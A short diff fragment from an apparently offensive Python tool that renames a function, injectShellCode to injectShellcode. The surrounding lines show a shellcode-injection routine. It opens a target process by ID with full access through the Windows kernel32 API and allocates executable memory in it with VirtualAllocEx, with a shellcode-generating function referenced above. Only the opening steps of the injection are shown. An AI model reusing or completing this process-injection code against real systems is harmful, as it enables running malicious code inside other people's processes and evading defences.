@@ -30,7 +30,7 @@ def generateShellcode(cmdString):
 	return shellcode
 	
 # Injects shellcode: Takes in shellcode as string, converts to bytearray
-def injectShellCode(pid, shellcode):
+def injectShellcode(pid, shellcode):
 	shellCode = bytearray(shellcode)   
 	process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)	
 	memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 0x1000, 0x40)
